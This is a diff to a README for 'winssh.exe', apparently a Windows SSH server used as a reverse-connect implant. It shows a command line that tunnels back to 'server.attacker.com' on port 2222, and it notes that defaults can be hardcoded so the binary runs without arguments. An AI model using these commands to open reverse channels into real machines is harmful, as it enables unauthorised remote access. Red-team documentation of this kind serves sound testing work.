@@ -11,14 +11,13 @@ You can specify a port using:
 winssh.exe --port <port>
 ```
 
-You can also specify a server to connect back to using:
+You can also specify a server and port to connect back to using:
 
 ```
-winssh.exe --server server.attacker.com
+winssh.exe --tunnel-server server.attacker.com --tunnel-port 2222
 ```
 
-Or you can modify the source to hardcode the default values for port and server resulting in a binary,
-that will execute witout any commandline args.
+Or you can modify the source to hardcode the default values resulting in a binary, that will execute witout any commandline args.
 
 On every build new keys will be generated. After starting the server you can use the "key" from the files directory.
 The key `key-reverse` from the files directory is used to connect back to the remote server (if specified).
